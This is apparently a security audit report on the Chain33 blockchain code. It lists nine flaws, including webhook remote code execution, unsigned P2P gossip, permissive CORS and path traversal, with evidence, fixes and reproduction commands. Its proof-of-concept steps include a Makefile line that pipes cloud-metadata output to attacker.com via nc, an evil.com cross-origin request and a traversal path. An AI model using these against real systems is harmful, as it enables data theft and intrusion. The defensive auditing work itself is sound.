# Chain33 Blind-Spot Audit 2026-08-16 — AUDITOR-4

Source: `/tmp/audit_blindspot.md` (24KB, 6 sections). Covers 9 surfaces missed by AUDITOR-1..3.

## Summary Table

| # | Surface | File:line | Severity | Exploitable |
|---|---------|-----------|----------|-------------|
| B1 | Webhook CI RCE via attacker `Makefile` + `make webhook` | `cmd/webhook/main.go:22,74-111` | CRITICAL | yes — any GitHub user |
| B2 | P2P gossip unsigned | `system/p2p/dht/extension/pubsub.go:120` | HIGH | yes — spoof tx/block |
| B3 | CORS Allow-All | `rpc/http.go:56` + `rpc/ethrpc/rpc.go:143,162` | MEDIUM | yes — CSRF when whitelist=* |
| B4 | `IsPublicIP` incomplete | `common/utils/ip.go:14-32` | MEDIUM | yes — misclassify CGNAT/multicast/IPv6 |
| B5 | ETH-RPC no BasicAuth | `rpc/ethrpc/rpc.go:219` vs `rpc/http.go:72` | MEDIUM | yes — bypass jrpcUserName |
| B6 | Pprof unconditional :6060 | `util/cli/chain33.go:136-147` | MEDIUM | yes — leaks heap/goroutine |
| B7 | jsonclient SSRF/DoS (no timeout/limit, InsecureSkipVerify) | `rpc/jsonclient/jsonclient.go:42-54,79-84` | MEDIUM | yes — OOM/SSRF |
| B8 | Store DbPath traversal | `common/db/go_level_db.go:69` + `system/p2p/dht/addrbook.go:39` | LOW→MED | config-mediated |
| B9 | safeNamePattern allows `..` | `cmd/webhook/main.go:22` | LOW | path escape |

## Key Evidence

- Webhook: `safeNamePattern=^[a-zA-Z0-9._-]+$` allows `..`; `gitpath=GOPATH+"/src/github.com/"+user+"/chain33"`; `exec.Command("make","webhook")` with `cmd.Dir=gitpath` runs attacker Makefile. No org allow-list.
- P2P: `WithMessageSigning(false), WithStrictSignatureVerification(false)` globally; `wrapper.go:AuthenticateMessage` only for `p2pstore`, zero hits in `broadcast/*`.
- CORS: `cors.New(cors.Options{})` = `AllowAllOrigins=*`; `node.NewHTTPHandlerStack(...,["*"],["*"],nil)` + `WebsocketHandler(["*"])`; prior fix only changed `OPTION→OPTIONS` string.
- IsPublicIP: only filters `10/8, 172.16/12, 192.168/16`; misses `0/8, 100.64/10, 192.0.2/24, 198.51.100/24, 203.0.113/24, 224/4, fc00::/7, fe80::/10, ff00::/8`; `224.0.0.1` test expects false but code returns true.
- Eth auth gap: `rpc/http.go:72 checkBasicAuth` present; `rpc/ethrpc/rpc.go:219 ServeHTTP` only `checkIPWhitelist`.
- Pprof: `util/cli/chain33.go:17 _ "net/http/pprof"` + `else { ListenAndServe("localhost:6060",nil)}` even when `cfg.Pprof==nil`.
- jsonclient: `http.DefaultClient` (Timeout 0), `ioutil.ReadAll(postresp.Body)` no LimitReader, `InsecureSkipVerify=!tlsVerify` defaults true.
- Store: `path.Join(dir,name+".db")` where `dir=cfg.DbPath` from TOML verbatim; `blockchain/export_block.go:378 filepath.Join(dir,datadir[2:])` traverses.

## Pre-mortems (§3 of source) — what if the "fix" is still wrong

Each finding has a falsification recipe:
1. B1: push `attacker/chain33` with `webhook:\n\tcurl http://169.254... | nc attacker.com` — if `make webhook` executes it, RCE proven; `..` PoC: `user=..` → `gitpath` escapes GOPATH.
2. B2: publish raw `pubsub.Message` on tx topic from third libp2p host without signing key — if delivered to `handleBroadcastSend`, unsigned gossip proven.
3. B3: from `evil.com` `fetch("http://victim:8801/",{method:"POST",body:JSONRPC})` succeeds when whitelist=* — proves AllowAll.
4. B4: run `TestIsPublicIP` — `224.0.0.1` returns true not false, proving gap; `100.64.0.1` similarly.
5. B6: set `pprof.listenAddr="0.0.0.0:6060"` → exposes pprof to all interfaces.
6. B8: set `dbPath="/tmp/../../etc/cron.d"` in chain33.toml → leveldb MkdirAll outside datadir.

## Recommended Fixes (triage)

1. Webhook: remove `make webhook` or sandbox (ephemeral Docker, org allow-list, verify `Head.Repo.FullName`), reject `"."`/`".."`, `filepath.Clean` + prefix check, `exec.CommandContext` timeout.
2. P2P: `WithMessageSigning(true)` + `WithStrictSignatureVerification(true)` or add `AuthenticateMessage` in broadcast handler.
3. CORS: explicit `AllowedOrigins` from whitelist, not `*`.
4. IsPublicIP: deny all IANA reserved + fix IPv6.
5. Eth: add `checkBasicAuth` in `ethrpc/rpc.go:ServeHTTP`.
6. Pprof: opt-in only (no else), gate with whitelist/auth.
7. jsonclient: `Timeout:10s`, `LimitReader(4<<20)`, `InsecureSkipVerify=false` default.
8. Store: `Clean` + `HasPrefix(cleanPath, cleanDatadir)`.

## How to Reproduce

```bash
go test ./common/utils -run TestIsPublicIP -v
curl -i -H "Origin: https://evil.com" http://localhost:8801/ -d '{"method":"Chain33.GetLastHeader","params":[{}],"id":1}' | grep -i access-control
curl http://localhost:6060/debug/pprof/goroutine?debug=1 | head
```
